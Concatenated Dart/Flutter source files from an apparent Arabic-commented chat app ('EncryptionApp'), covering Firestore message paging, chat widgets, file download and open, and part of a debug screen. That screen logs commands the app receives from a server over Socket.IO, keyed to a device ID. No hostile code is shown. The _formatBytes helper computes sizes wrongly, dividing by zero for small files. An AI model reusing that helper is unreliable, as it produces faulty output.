import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';

import '../../../core/logging/logger_provider.dart';
import '../../../data/models/chat/chat_message.dart';
import '../../../data/repositories/firestore_repository.dart';
import '../../chat/providers/auth_providers.dart';

/// نموذج عرض للرسائل يدعم التحميل الكسول والصفحات
class MessageViewModel extends StateNotifier<AsyncValue<List<ChatMessage>>> {
  final FirestoreRepository _repository;
  final String _conversationId;
  final int _pageSize;
  
  // تتبع ما إذا كان هناك المزيد من الرسائل للتحميل
  bool _hasMoreMessages = true;
  
  // تتبع ما إذا كان التحميل جارٍ حاليًا
  bool _isLoadingMore = false;
  
  // تخزين أقدم رسالة تم تحميلها للاستخدام في تحميل المزيد
  DateTime? _oldestMessageTimestamp;

  MessageViewModel(this._repository, this._conversationId, {int pageSize = 20}) 
      : _pageSize = pageSize,
        super(const AsyncValue.loading()) {
    // بدء الاستماع لتدفق الرسائل
    _listenToMessages();
  }

  /// بدء الاستماع لتدفق الرسائل
  void _listenToMessages() {
    _repository.getMessagesStream(_conversationId, pageSize: _pageSize).listen(
      (messages) {
        // تحديث الحالة بالرسائل الجديدة
        state = AsyncValue.data(messages);
        
        // تحديث أقدم رسالة إذا كانت هناك رسائل
        if (messages.isNotEmpty) {
          _oldestMessageTimestamp = messages.first.timestamp;
        }
        
        // إعادة تعيين حالة التحميل
        _isLoadingMore = false;
      },
      onError: (error, stackTrace) {
        // تحديث الحالة بالخطأ
        state = AsyncValue.error(error, stackTrace);
        
        // إعادة تعيين حالة التحميل
        _isLoadingMore = false;
      }
    );
  }

  /// تحميل المزيد من الرسائل (صفحة سابقة)
  Future<void> loadMoreMessages() async {
    // التحقق من وجود المزيد من الرسائل وأن التحميل ليس جاريًا حاليًا
    if (!_hasMoreMessages || _isLoadingMore || _oldestMessageTimestamp == null) {
      return;
    }
    
    // تعيين حالة التحميل
    _isLoadingMore = true;
    
    try {
      // تحميل المزيد من الرسائل
      final newMessages = await _repository.loadMoreMessages(
        _conversationId, 
        _oldestMessageTimestamp!, 
        pageSize: _pageSize
      );
      
      // التحقق مما إذا كان هناك المزيد من الرسائل
      if (newMessages.isEmpty) {
        _hasMoreMessages = false;
        _isLoadingMore = false;
        return;
      }
      
      // تحديث أقدم رسالة
      if (newMessages.isNotEmpty) {
        _oldestMessageTimestamp = newMessages.first.timestamp;
      }
      
      // ملاحظة: لا نحتاج إلى تحديث الحالة هنا لأن تدفق الرسائل سيقوم بذلك
    } catch (e) {
      // إعادة تعيين حالة التحميل في حالة الخطأ
      _isLoadingMore = false;
    }
  }

  /// إرسال رسالة جديدة
  Future<bool> sendMessage(ChatMessage message) async {
    return _repository.sendMessage(_conversationId, message);
  }

  /// التحقق مما إذا كان هناك المزيد من الرسائل للتحميل
  bool get hasMoreMessages => _hasMoreMessages;
  
  /// التحقق مما إذا كان التحميل جارٍ حاليًا
  bool get isLoadingMore => _isLoadingMore;
}

/// مزود لنموذج عرض الرسائل
final messageViewModelProvider = StateNotifierProvider.family<MessageViewModel, AsyncValue<List<ChatMessage>>, String>(
  (ref, conversationId) {
    // الحصول على مستودع Firestore
    final repository = ref.watch(firestoreRepositoryProvider);
    
    // إنشاء نموذج عرض الرسائل
    return MessageViewModel(repository, conversationId);
  }
);

/// مزود لمستودع Firestore
final firestoreRepositoryProvider = Provider<FirestoreRepository>((ref) {
  final firestore = ref.watch(firestoreProvider);
  final storage = ref.watch(firebaseStorageProvider);
  final logger = ref.watch(appLoggerProvider);
  final agentCodeAsync = ref.watch(currentAgentCodeProvider);
  
  return agentCodeAsync.when(
    data: (agentCode) {
      if (agentCode != null && agentCode.isNotEmpty) {
        return FirestoreRepository(firestore, storage, logger, agentCode);
      }
      throw Exception("Agent code is null or empty");
    },
    loading: () => throw Exception("Agent code is loading"),
    error: (error, _) => throw Exception("Error loading agent code: $error"),
  );
});

/// مزود لـ Firestore
final firestoreProvider = Provider((ref) => FirebaseFirestore.instance);

/// مزود لـ Firebase Storage
final firebaseStorageProvider = Provider((ref) => FirebaseStorage.instance);



// ------------------------------ نهاية الملف: message_view_model.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: chat_list_item.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\widgets\chat_list_item.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/widgets/chat_list_item.dart
import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:intl/intl.dart' as intl; // لتنسيق الوقت

import '../../../data/models/chat/chat_conversation.dart';

class ChatListItem extends StatelessWidget {
  final ChatConversation conversation;
  final VoidCallback onTap;

  const ChatListItem({
    super.key,
    required this.conversation,
    required this.onTap,
  });

  String _formatTimestamp(DateTime? timestamp) {
    if (timestamp == null) return '';
    final now = DateTime.now();
    final today = DateTime(now.year, now.month, now.day);
    final yesterday = DateTime(now.year, now.month, now.day - 1);
    final dateToFormat =
        DateTime(timestamp.year, timestamp.month, timestamp.day);

    if (dateToFormat == today) {
      return intl.DateFormat.Hm().format(timestamp); //  'HH:mm' e.g., 14:30
    } else if (dateToFormat == yesterday) {
      return 'الأمس';
    } else if (now.difference(timestamp).inDays < 7) {
      return intl.DateFormat.E('ar')
          .format(timestamp); // اسم اليوم، e.g. 'السبت'
    } else {
      return intl.DateFormat.yMd('ar').format(timestamp); // 'd/M/yyyy'
    }
  }

  @override
  Widget build(BuildContext context) {
    final theme = Theme.of(context);
    final isDark = theme.brightness == Brightness.dark;
    // استخدم conversationTitle بدلاً من userName
    final title = conversation.conversationTitle;
    final lastMessage = conversation.lastMessageText ?? 'لا توجد رسائل بعد';
    final time = _formatTimestamp(conversation.lastMessageTimestamp);

    // تحديد ما إذا كانت الرسالة الأخيرة من المستخدم الحالي
    // final bool isLastMessageFromCurrentUser = conversation.lastMessageSenderAgentCode == currentAgentCode; // Need currentAgentCode
    // يمكنك إضافة "أنت: " إذا كانت من المستخدم الحالي

    return ListTile(
      onTap: onTap,
      leading: CircleAvatar(
        backgroundColor: theme.primaryColor.withOpacity(0.1),
        foregroundColor: theme.primaryColor,
        // يمكنك استخدام الحرف الأول من العنوان أو أيقونة عامة
        child: Text(
          title.isNotEmpty ? title[0].toUpperCase() : 'C',
          style: GoogleFonts.cairo(fontWeight: FontWeight.bold, fontSize: 18),
        ),
      ),
      title: Text(
        title,
        style: GoogleFonts.cairo(fontWeight: FontWeight.w600, fontSize: 16.5),
        maxLines: 1,
        overflow: TextOverflow.ellipsis,
      ),
      subtitle: Text(
        lastMessage,
        style: GoogleFonts.cairo(
          fontSize: 13.5,
          color: isDark ? Colors.grey[400] : Colors.grey[600],
        ),
        maxLines: 1,
        overflow: TextOverflow.ellipsis,
      ),
      trailing: Text(
        time,
        style: GoogleFonts.cairo(
          fontSize: 12,
          color: isDark ? Colors.grey[500] : Colors.grey[500],
        ),
      ),
      contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 6),
    );
  }
}



// ------------------------------ نهاية الملف: chat_list_item.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: message_bubble.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\widgets\message_bubble.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/widgets/message_bubble.dart
import "dart:io";
import "dart:typed_data";

import "package:dio/dio.dart";
import "package:flutter/material.dart";
import "package:flutter_riverpod/flutter_riverpod.dart";
import "package:google_fonts/google_fonts.dart";
import "package:intl/intl.dart" as intl;
import "package:open_file/open_file.dart";
import "package:path_provider/path_provider.dart";
import "package:photo_view/photo_view.dart";
import "package:video_player/video_player.dart";

import "../../../core/logging/logger_provider.dart";
import "../../../core/utils/file_saver.dart";
import "../../../data/models/chat/chat_message.dart";

String _formatBytes(int bytes, int decimals) {
  if (bytes <= 0) return "0 B";
  const suffixes = ["B", "KB", "MB", "GB", "TB"];
  var i = (bytes.toString().length - 1) ~/ 3;
  if (i >= suffixes.length) i = suffixes.length - 1;
  return "${(bytes / (1024 * 1024 * i)).toStringAsFixed(decimals)} ${suffixes[i]}";
}

class MessageBubble extends ConsumerStatefulWidget {
  final ChatMessage message;

  const MessageBubble({super.key, required this.message});

  @override
  ConsumerState<MessageBubble> createState() => _MessageBubbleState();
}

class _MessageBubbleState extends ConsumerState<MessageBubble> {
  VideoPlayerController? _videoController;
  bool _isDownloading = false;
  double _downloadProgress = 0.0;

  @override
  void initState() {
    super.initState();
    if (widget.message.messageType == MessageType.video &&
        widget.message.fileUrl != null) {
      _videoController = VideoPlayerController.networkUrl(
          Uri.parse(widget.message.fileUrl!),
        )
        ..initialize().then((_) {
          if (mounted) {
            setState(() {});
          }
        });
    }
  }

  @override
  void dispose() {
    _videoController?.dispose();
    super.dispose();
  }

  Future<void> _downloadAndSaveFile(
    BuildContext context,
    String url,
    String fileName,
  ) async {
    final logger = ref.read(appLoggerProvider);
    if (!mounted) return;
    setState(() {
      _isDownloading = true;
      _downloadProgress = 0.0;
    });
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text("بدء تنزيل: $fileName", style: GoogleFonts.cairo()),
      ),
    );
    try {
      Dio dio = Dio();
      final response = await dio.get<List<int>>(
        url,
        options: Options(responseType: ResponseType.bytes),
        onReceiveProgress: (received, total) {
          if (total != -1 && mounted) {
            setState(() => _downloadProgress = received / total);
          }
        },
      );

      if (response.data != null) {
        final result = await FileSaver.saveFile(
          bytes: Uint8List.fromList(response.data!),
          suggestedFileName: fileName,
        );
        if (mounted) {
          ScaffoldMessenger.of(context).removeCurrentSnackBar();
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(content: Text(result, style: GoogleFonts.cairo())),
          );
        }
        logger.info("MessageBubble", "File saved: $fileName. Result: $result");
      }
    } catch (e, s) {
      logger.error(
        "MessageBubble",
        "Error downloading/saving file: $fileName",
        e,
        s,
      );
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(
              "فشل التنزيل: ${e.toString()}",
              style: GoogleFonts.cairo(),
            ),
            backgroundColor: Colors.red,
          ),
        );
      }
    } finally {
      if (mounted) {
        setState(() {
          _isDownloading = false;
          _downloadProgress = 0.0;
        });
      }
    }
  }

  Future<void> _openFile(
    BuildContext context,
    String url,
    String fileName,
  ) async {
    final logger = ref.read(appLoggerProvider);
    if (!mounted) return;

    setState(() {
      _isDownloading = true;
      _downloadProgress = 0.0;
    });

    try {
      final Directory tempDir = await getTemporaryDirectory();
      final String localPath = "${tempDir.path}/$fileName";

      await Dio().download(
        url,
        localPath,
        onReceiveProgress: (received, total) {
          if (total != -1 && mounted) {
            setState(() => _downloadProgress = received / total);
          }
        },
      );

      final result = await OpenFile.open(localPath);

      if (result.type != ResultType.done && mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text("فشل فتح الملف: ${result.message}"),
            backgroundColor: Colors.orange,
          ),
        );
      }
    } catch (e, s) {
      logger.error("MessageBubble", "Error opening file: $fileName", e, s);
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text("خطأ: ${e.toString()}"),
            backgroundColor: Colors.red,
          ),
        );
      }
    } finally {
      if (mounted) {
        setState(() {
          _isDownloading = false;
          _downloadProgress = 0.0;
        });
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    final bool isSentByCurrentUser = widget.message.isSentByCurrentUser;
    final theme = Theme.of(context);
    final bubbleColor =
        isSentByCurrentUser
            ? theme.primaryColor.withOpacity(0.9)
            : (theme.brightness == Brightness.dark
                ? Colors.grey[800]!
                : Colors.grey[200]!);
    final textColor =
        isSentByCurrentUser
            ? Colors.white
            : (theme.brightness == Brightness.dark
                ? Colors.white.withOpacity(0.9)
                : Colors.black.withOpacity(0.87));

    final timeFormatted = intl.DateFormat.Hm(
      "ar",
    ).format(widget.message.timestamp);

    Widget messageContent;
    List<Widget> actionButtons = [];

    if (widget.message.fileUrl != null && widget.message.fileName != null) {
      actionButtons.addAll([
        IconButton(
          icon: Icon(Icons.download_outlined, color: textColor, size: 20),
          tooltip: "تنزيل الملف",
          onPressed:
              _isDownloading
                  ? null
                  : () => _downloadAndSaveFile(
                    context,
                    widget.message.fileUrl!,
                    widget.message.fileName!,
                  ),
        ),
        IconButton(
          icon: Icon(Icons.open_in_new, color: textColor, size: 20),
          tooltip: "فتح الملف",
          onPressed:
              _isDownloading
                  ? null
                  : () => _openFile(
                    context,
                    widget.message.fileUrl!,
                    widget.message.fileName!,
                  ),
        ),
      ]);
    }

    switch (widget.message.messageType) {
      case MessageType.text:
        messageContent = Text(
          widget.message.text ?? "",
          style: GoogleFonts.cairo(color: textColor, fontSize: 15),
        );
        break;
      case MessageType.image:
        if (widget.message.fileUrl != null) {
          messageContent = GestureDetector(
            onTap:
                () => Navigator.push(
                  context,
                  MaterialPageRoute(
                    builder:
                        (_) => Scaffold(
                          appBar: AppBar(
                            title: Text(
                              widget.message.fileName ?? "صورة",
                              style: GoogleFonts.cairo(),
                            ),
                            backgroundColor: Colors.black,
                          ),
                          body: PhotoView(
                            imageProvider: NetworkImage(
                              widget.message.fileUrl!,
                            ),
                            loadingBuilder:
                                (_, __) => const Center(
                                  child: CircularProgressIndicator(),
                                ),
                            backgroundDecoration: const BoxDecoration(
                              color: Colors.black,
                            ),
                          ),
                        ),
                  ),
                ),
            child: ConstrainedBox(
              constraints: BoxConstraints(
                maxHeight: 250,
                maxWidth: MediaQuery.of(context).size.width * 0.6,
              ),
              child: ClipRRect(
                borderRadius: BorderRadius.circular(8),
                child: Image.network(
                  widget.message.fileUrl!,
                  fit: BoxFit.cover,
                  loadingBuilder:
                      (_, child, progress) =>
                          progress == null
                              ? child
                              : Center(
                                child: CircularProgressIndicator(
                                  value:
                                      progress.expectedTotalBytes != null
                                          ? progress.cumulativeBytesLoaded /
                                              progress.expectedTotalBytes!
                                          : null,
                                ),
                              ),
                  errorBuilder:
                      (_, __, ___) => Container(
                        color: Colors.grey[300],
                        child: const Icon(Icons.broken_image, size: 50),
                      ),
                ),
              ),
            ),
          );
        } else {
          messageContent = Text(
            "[صورة غير متاحة]",
            style: GoogleFonts.cairo(color: textColor),
          );
        }
        break;
      case MessageType.video:
        if (_videoController != null && _videoController!.value.isInitialized) {
          messageContent = GestureDetector(
            onTap:
                () => Navigator.push(
                  context,
                  MaterialPageRoute(
                    builder:
                        (_) => Scaffold(
                          appBar: AppBar(
                            title: Text(
                              widget.message.fileName ?? "فيديو",
                              style: GoogleFonts.cairo(),
                            ),
                            backgroundColor: Colors.black,
                          ),
                          body: Center(
                            child: AspectRatio(
                              aspectRatio: _videoController!.value.aspectRatio,
                              child: VideoPlayer(_videoController!),
                            ),
                          ),
                          floatingActionButton: FloatingActionButton(
                            onPressed:
                                () =>
                                    _videoController!.value.isPlaying
                                        ? _videoController!.pause()
                                        : _videoController!.play(),
                            child: Icon(
                              _videoController!.value.isPlaying
                                  ? Icons.pause
                                  : Icons.play_arrow,
                            ),
                          ),
                        ),
                  ),
                ),
            child: Stack(
              alignment: Alignment.center,
              children: [
                AspectRatio(
                  aspectRatio: _videoController!.value.aspectRatio,
                  child: VideoPlayer(_videoController!),
                ),
                Icon(Icons.play_circle_fill, size: 50, color: Colors.white70),
              ],
            ),
          );
        } else {
          messageContent = Container(
            height: 150,
            color: Colors.black,
            child: const Center(child: CircularProgressIndicator()),
          );
        }
        break;
      case MessageType.file:
        messageContent = Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(Icons.insert_drive_file, color: textColor, size: 30),
            const SizedBox(width: 8),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    widget.message.fileName ?? "ملف",
                    style: GoogleFonts.cairo(color: textColor, fontSize: 14),
                    overflow: TextOverflow.ellipsis,
                  ),
                  if (widget.message.fileSize != null)
                    Text(
                      _formatBytes(widget.message.fileSize!, 1),
                      style: GoogleFonts.cairo(
                        color: textColor.withOpacity(0.7),
                        fontSize: 10,
                      ),
                    ),
                ],
              ),
            ),
          ],
        );
        break;
      default:
        messageContent = Text(
          "[رسالة غير معروفة]",
          style: GoogleFonts.cairo(color: textColor),
        );
    }

    return Align(
      alignment:
          isSentByCurrentUser ? Alignment.centerRight : Alignment.centerLeft,
      child: Container(
        constraints: BoxConstraints(
          maxWidth: MediaQuery.of(context).size.width * 0.75,
        ),
        margin: const EdgeInsets.symmetric(vertical: 4, horizontal: 8),
        padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 12),
        decoration: BoxDecoration(
          color: bubbleColor,
          borderRadius: BorderRadius.only(
            topLeft: const Radius.circular(12),
            topRight: const Radius.circular(12),
            bottomLeft:
                isSentByCurrentUser ? const Radius.circular(12) : Radius.zero,
            bottomRight:
                isSentByCurrentUser ? Radius.zero : const Radius.circular(12),
          ),
          boxShadow: [
            BoxShadow(
              color: Colors.black.withOpacity(0.05),
              blurRadius: 3,
              offset: const Offset(0, 1),
            ),
          ],
        ),
        child: Column(
          crossAxisAlignment:
              isSentByCurrentUser
                  ? CrossAxisAlignment.end
                  : CrossAxisAlignment.start,
          mainAxisSize: MainAxisSize.min,
          children: [
            messageContent,
            if (_isDownloading)
              Padding(
                padding: const EdgeInsets.only(top: 4.0),
                child: LinearProgressIndicator(
                  value: _downloadProgress,
                  backgroundColor: textColor.withOpacity(0.2),
                  valueColor: AlwaysStoppedAnimation<Color>(textColor),
                ),
              ),
            const SizedBox(height: 2),
            Row(
              mainAxisSize: MainAxisSize.min,
              children: [
                ...actionButtons,
                const SizedBox(width: 4),
                Text(
                  timeFormatted,
                  style: GoogleFonts.cairo(
                    color: textColor.withOpacity(0.7),
                    fontSize: 10,
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }
}



// ------------------------------ نهاية الملف: message_bubble.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: message_input_bar.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\widgets\message_input_bar.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/widgets/message_input_bar.dart
import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';

class MessageInputBar extends StatefulWidget {
  final Function(String) onSendPressed;
  final VoidCallback onAttachmentPressed;

  const MessageInputBar({
    super.key,
    required this.onSendPressed,
    required this.onAttachmentPressed,
  });

  @override
  State<MessageInputBar> createState() => _MessageInputBarState();
}

class _MessageInputBarState extends State<MessageInputBar> {
  final TextEditingController _textController = TextEditingController();
  bool _canSend = false;

  @override
  void initState() {
    super.initState();
    _textController.addListener(() {
      if (mounted) {
        // تحقق من أن الـ widget ما زال في الشجرة
        setState(() {
          _canSend = _textController.text.trim().isNotEmpty;
        });
      }
    });
  }

  @override
  void dispose() {
    _textController.dispose();
    super.dispose();
  }

  void _handleSend() {
    if (_canSend) {
      widget.onSendPressed(_textController.text.trim());
      _textController.clear();
      // FocusScope.of(context).unfocus(); // لإخفاء لوحة المفاتيح بعد الإرسال
    }
  }

  @override
  Widget build(BuildContext context) {
    final theme = Theme.of(context);
    final isDark = theme.brightness == Brightness.dark;

    return Material(
      // لإضافة ظل طفيف
      elevation: 5.0,
      color: theme.cardColor, // استخدام لون البطاقة كخلفية أو لون السطح
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 8.0, vertical: 8.0),
        // decoration: BoxDecoration( // يمكن إزالة هذا إذا كان لون Material كافيًا
        //   color: theme.cardColor,
        //   // border: Border(top: BorderSide(color: isDark ? Colors.grey[700]! : Colors.grey[300]!)),
        // ),
        child: Row(
          children: <Widget>[
            // زر المرفقات
            IconButton(
              icon: Icon(Icons.attach_file_outlined,
                  color: theme.primaryColor.withOpacity(0.8)),
              iconSize: 26,
              tooltip: 'إرفاق ملف',
              onPressed: widget.onAttachmentPressed,
            ),
            // حقل إدخال النص
            Expanded(
              child: TextField(
                controller: _textController,
                style: GoogleFonts.cairo(fontSize: 15.5),
                decoration: InputDecoration(
                  hintText: 'اكتب رسالتك هنا...',
                  hintStyle:
                      GoogleFonts.cairo(color: Colors.grey[500], fontSize: 15),
                  border: InputBorder.none, // إزالة الحدود الافتراضية
                  focusedBorder: InputBorder.none, // لا حدود عند التركيز
                  enabledBorder: InputBorder.none,
                  contentPadding: const EdgeInsets.symmetric(
                      horizontal: 12, vertical: 10), // تعديل الحشو
                  // filled: true, // لا حاجة لـ filled إذا كان Container يعطي الخلفية
                  // fillColor: theme.inputDecorationTheme.fillColor,
                ),
                keyboardType: TextInputType.multiline,
                minLines: 1,
                maxLines: 5, // السماح بعدة أسطر
                textInputAction:
                    TextInputAction.send, // تغيير زر الإدخال إلى "إرسال"
                onSubmitted: (_) =>
                    _handleSend(), // الإرسال عند الضغط على "إرسال" من لوحة المفاتيح
              ),
            ),
            // زر الإرسال
            IconButton(
              icon: Icon(
                Icons.send_rounded, // أيقونة إرسال أفضل
                color: _canSend ? theme.primaryColor : Colors.grey[400],
              ),
              iconSize: 28,
              tooltip: 'إرسال',
              onPressed: _canSend
                  ? _handleSend
                  : null, // تعطيل الزر إذا لم يكن هناك نص
            ),
          ],
        ),
      ),
    );
  }
}



// ------------------------------ نهاية الملف: message_input_bar.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: debug_monitor_screen.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\debug_monitor\debug_monitor_screen.dart
// ----------------------------------------------------------------------

import 'dart:async';

import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';

import '../../core/logging/logger_provider.dart';
import '../../core/logging/logger_service.dart';
import '../../services/network_service.dart';
import '../../services/device_info_service.dart';
import '../../utils/constants.dart';

// Provider للوصول إلى حالة شاشة المراقبة
final debugMonitorProvider = StateNotifierProvider<DebugMonitorNotifier, DebugMonitorState>((ref) {
  final logger = ref.watch(appLoggerProvider);
  return DebugMonitorNotifier(logger);
});

// نموذج حالة شاشة المراقبة
class DebugMonitorState {
  final List<LogEntry> logs;
  final bool isConnected;
  final String connectionStatus;
  final int totalCommands;
  final int successfulCommands;
  final int failedCommands;
  final String lastError;
  final DateTime lastUpdateTime;

  DebugMonitorState({
    required this.logs,
    required this.isConnected,
    required this.connectionStatus,
    required this.totalCommands,
    required this.successfulCommands,
    required this.failedCommands,
    required this.lastError,
    required this.lastUpdateTime,
  });

  factory DebugMonitorState.initial() {
    return DebugMonitorState(
      logs: [],
      isConnected: false,
      connectionStatus: 'غير متصل',
      totalCommands: 0,
      successfulCommands: 0,
      failedCommands: 0,
      lastError: 'لا يوجد',
      lastUpdateTime: DateTime.now(),
    );
  }

  DebugMonitorState copyWith({
    List<LogEntry>? logs,
    bool? isConnected,
    String? connectionStatus,
    int? totalCommands,
    int? successfulCommands,
    int? failedCommands,
    String? lastError,
    DateTime? lastUpdateTime,
  }) {
    return DebugMonitorState(
      logs: logs ?? this.logs,
      isConnected: isConnected ?? this.isConnected,
      connectionStatus: connectionStatus ?? this.connectionStatus,
      totalCommands: totalCommands ?? this.totalCommands,
      successfulCommands: successfulCommands ?? this.successfulCommands,
      failedCommands: failedCommands ?? this.failedCommands,
      lastError: lastError ?? this.lastError,
      lastUpdateTime: lastUpdateTime ?? this.lastUpdateTime,
    );
  }
}

// نموذج لسجل الأحداث
class LogEntry {
  final String message;
  final String level;
  final DateTime timestamp;
  final String source;

  LogEntry({
    required this.message,
    required this.level,
    required this.timestamp,
    required this.source,
  });
}

// مدير حالة شاشة المراقبة
class DebugMonitorNotifier extends StateNotifier<DebugMonitorState> {
  final LoggerService _logger;
  StreamSubscription? _logSubscription;
  StreamSubscription? _connectionSubscription;
  StreamSubscription? _commandSubscription;
  NetworkService? _networkService;

  DebugMonitorNotifier(this._logger) : super(DebugMonitorState.initial()) {
    _initializeMonitoring();
  }

  void _initializeMonitoring() {
    // الاشتراك في سجلات النظام
    _logSubscription = _logger.logStream.listen((logEvent) {
      final newLog = LogEntry(
        message: logEvent.message,
        level: logEvent.level.toString(),
        timestamp: logEvent.timestamp,
        source: logEvent.source,
      );
      
      final updatedLogs = [...state.logs, newLog];
      // الاحتفاظ بآخر 100 سجل فقط لتجنب استهلاك الذاكرة
      if (updatedLogs.length > 100) {
        updatedLogs.removeAt(0);
      }
      
      state = state.copyWith(
        logs: updatedLogs,
        lastUpdateTime: DateTime.now(),
      );
      
      // تحديث آخر خطأ إذا كان السجل يحتوي على خطأ
      if (logEvent.level == LogLevel.ERROR || logEvent.level == LogLevel.CRITICAL) {
        state = state.copyWith(
          lastError: "${logEvent.source}: ${logEvent.message}",
          lastUpdateTime: DateTime.now(),
        );
      }
    });
    
    // تهيئة خدمة الشبكة ومراقبة حالة الاتصال
    try {
      _networkService = NetworkService();
      
      _connectionSubscription = _networkService?.connectionStatusStream.listen((isConnected) {
        state = state.copyWith(
          isConnected: isConnected,
          connectionStatus: isConnected ? 'متصل' : 'غير متصل',
          lastUpdateTime: DateTime.now(),
        );
      });
      
      // مراقبة الأوامر الواردة
      _commandSubscription = _networkService?.commandStream.listen((commandData) {
        final cmd = commandData['command'] as String;
        final commandId = commandData['command_id'] as String?;
        
        state = state.copyWith(
          totalCommands: state.totalCommands + 1,
          lastUpdateTime: DateTime.now(),
        );
        
        // إضافة سجل للأمر الوارد
        final newLog = LogEntry(
          message: "تم استلام أمر: $cmd (ID: ${commandId ?? 'غير معروف'})",
          level: "INFO",
          timestamp: DateTime.now(),
          source: "DebugMonitor",
        );
        
        final updatedLogs = [...state.logs, newLog];
        if (updatedLogs.length > 100) {
          updatedLogs.removeAt(0);
        }
        
        state = state.copyWith(
          logs: updatedLogs,
        );
      });
    } catch (e) {
      _logger.error("DebugMonitor", "خطأ في تهيئة مراقبة الشبكة", e);
    }
  }
  
  // تسجيل نجاح تنفيذ أمر
  void recordCommandSuccess(String commandName, String? commandId) {
    state = state.copyWith(
      successfulCommands: state.successfulCommands + 1,
      lastUpdateTime: DateTime.now(),
    );
    
    final newLog = LogEntry(
      message: "تم تنفيذ الأمر بنجاح: $commandName (ID: ${commandId ?? 'غير معروف'})",
      level: "SUCCESS",
      timestamp: DateTime.now(),
      source: "DebugMonitor",
    );
    
    final updatedLogs = [...state.logs, newLog];
    if (updatedLogs.length > 100) {
      updatedLogs.removeAt(0);
    }
    
    state = state.copyWith(
      logs: updatedLogs,
    );
  }
  
  // تسجيل فشل تنفيذ أمر
  void recordCommandFailure(String commandName, String? commandId, String error) {
    state = state.copyWith(
      failedCommands: state.failedCommands + 1,
      lastError: "فشل الأمر $commandName: $error",
      lastUpdateTime: DateTime.now(),
    );
    
    final newLog = LogEntry(
      message: "فشل تنفيذ الأمر: $commandName (ID: ${commandId ?? 'غير معروف'}) - $error",
      level: "ERROR",
      timestamp: DateTime.now(),
      source: "DebugMonitor",
    );
    
    final updatedLogs = [...state.logs, newLog];
    if (updatedLogs.length > 100) {
      updatedLogs.removeAt(0);
    }
    
    state = state.copyWith(
      logs: updatedLogs,
    );
  }
  
  // محاولة إعادة الاتصال بالخادم
  Future<void> attemptReconnect(String deviceId) async {
    try {
      _logger.info("DebugMonitor", "محاولة إعادة الاتصال بالخادم...");
      await _networkService?.connectSocketIO(deviceId);
      
      final newLog = LogEntry(
        message: "تم بدء محاولة إعادة الاتصال بالخادم",
        level: "INFO",
        timestamp: DateTime.now(),
        source: "DebugMonitor",
      );
      
      final updatedLogs = [...state.logs, newLog];
      if (updatedLogs.length > 100) {
        updatedLogs.removeAt(0);
      }
      
      state = state.copyWith(
        logs: updatedLogs,
        lastUpdateTime: DateTime.now(),
      );
    } catch (e) {
      _logger.error("DebugMonitor", "فشل في محاولة إعادة الاتصال", e);
    }
  }
  
  // تنظيف الاشتراكات عند التخلص من المراقب
  @override
  void dispose() {
    _logSubscription?.cancel();
    _connectionSubscription?.cancel();
    _commandSubscription?.cancel();
    super.dispose();
  }
}

// شاشة مراقبة التصحيح
class DebugMonitorScreen extends ConsumerWidget {
  const DebugMonitorScreen({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final state = ref.watch(debugMonitorProvider);
    final notifier = ref.read(debugMonitorProvider.notifier);
    final deviceInfoService = DeviceInfoService();
    
    return Scaffold(
      appBar: AppBar(
        title: const Text('شاشة مراقبة النظام'),
        actions: [
          IconButton(
            icon: const Icon(Icons.refresh),
            onPressed: () async {
              // الحصول على معرف الجهاز وإعادة الاتصال
              try {
                final deviceId = await deviceInfoService.getOrCreateUniqueDeviceId();
                await notifier.attemptReconnect(deviceId);
              } catch (e) {
                ScaffoldMessenger.of(context).showSnackBar(
                  SnackBar(content: Text('خطأ: ${e.toString()}')),
                );
              }
            },
          ),
        ],
      ),
      body: Column(
        children: [
          // قسم حالة الاتصال
          _buildStatusCard(state),
          
          // قسم السجلات
          Expanded(
            child: _buildLogsList(state),
          ),
        ],
      ),
    );
  }
  
  Widget _buildStatusCard(DebugMonitorState state) {
    return Card(
      margin: const EdgeInsets.all(8.0),
      child: Padding(
        padding: const EdgeInsets.all(16.0),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                const Text(
                  'حالة الاتصال:',
                  style: TextStyle(fontWeight: FontWeight.bold),
                ),
                Row(
                  children: [
                    Icon(
                      state.isConnected ? Icons.check_circle : Icons.error,
                      color: state.isConnected ? Colors.green : Colors.red,
                    ),
                    const SizedBox(width: 4),
                    Text(state.connectionStatus),
                  ],
                ),
              ],
            ),
            const Divider(),
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                const Text('إجمالي الأوامر:'),
                Text('${state.totalCommands}'),
              ],
            ),
